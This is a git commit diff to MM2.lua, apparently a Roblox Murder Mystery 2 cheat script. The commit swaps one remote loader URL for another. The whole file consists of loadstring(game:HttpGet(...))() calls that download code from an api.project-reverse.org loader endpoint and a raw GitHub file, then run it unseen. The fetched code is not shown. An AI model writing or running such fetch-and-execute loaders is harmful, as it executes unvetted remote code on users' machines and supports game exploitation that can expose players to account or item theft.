8356910d61d90a23ef089858ae0df7f4d8e02f37
Anonimo221123 <misaelgarciaparedes2782009@gmail.com>
2026-03-31 16:08:52 -0500

    Update loadstring URLs in MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3ZGEzOWYzLTU5NGUtNDBmOS1hMDllLTRlNmQ3N2VkMjY4YyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImU3ZGEzOWYzLTU5NGUtNDBmOS1hMDllLTRlNmQ3N2VkMjY4YyIsImtpbmQiOiJsb2FkZXIifQ"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Anonimo221123/FarmeoVisual/refs/heads/main/MM2.lua'))()
